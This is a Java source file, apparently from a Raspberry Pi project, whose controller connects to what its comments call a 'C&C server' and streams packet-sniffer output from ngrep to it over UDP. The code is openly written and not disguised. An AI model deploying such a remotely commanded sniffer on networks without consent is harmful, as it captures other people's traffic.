package rPi.controllers;
import java.io.BufferedReader;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;

import rPi.connectors.Connector;

/*
 * This class has the responsibility for networking and "calling home"
 */

public class ConnectionController {

	//====== THE CONSTANTS YOU MIGHT WANNA CHANGE ======//
	
	private static InetAddress SERVER_IP	; // Hard code IP for now
	private static short DEFAULT_PORT = 9000; // the TCP port the server listens on
	private static int UDP_PORT_TO_SEND_FROM = 15000;
	
	//=================================================//
	
	Connector con = new Connector();
	BufferedReader inputFromServer;
	String fromServer;
	StreamParser parser = new StreamParser();
	
	public ConnectionController() throws Exception{
		SERVER_IP = InetAddress.getByName("10.16.167.8");	
		System.out.println("Connectionscontroller constructor init'd");
	}
	
	public BufferedReader connectToServer(){
		// from here we get the command from the C&C server
		try {
			SERVER_IP = InetAddress.getByName("10.16.99.177");
		} catch (UnknownHostException e1) {
			System.out.println("Could not resolve server ip to InetAddress");
			e1.printStackTrace();
		}
		DataHandler dHandler = new DataHandler(); // this instance executes the sniffing program in a terminal
		inputFromServer = con.initTCPClient(SERVER_IP, DEFAULT_PORT); 
		
		System.out.println("tcp initialized, now sending create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
		con.sendTCP("create\n");
		try {
			Thread.sleep(500);
		} catch (InterruptedException e) {
			System.out.println("gimme sleeping pills xD");
			e.printStackTrace();
		}
		con.sendTCP("start\n");
		return inputFromServer;
	}
	public void initAndSendUDP(BufferedReader outputStream, int portnr){
		con.initUDP(UDP_PORT_TO_SEND_FROM, portnr,SERVER_IP);  // extractportnumber skal fejltjekkes for port 0
		con.sendUDP(outputStream); // The start sniffing method returns a buffered reader with output from ngrep
	}
	public void stopUDP(){
		con.stopUDP();
	}
	
	public void sendStringTCP(String str){
		con.sendTCP(str);
		con.sendTCP("\r\n");
	}
	public void sendArrayTCP(ArrayList<String[]> arrList){
		for (String[] array : arrList){
			for (String str : array){
				System.out.println("array string sent : " + str);
				con.sendTCP(str + "\n");
			}
		}
		System.out.println("TCParray sent");
		con.sendTCP("\0");
	}
}
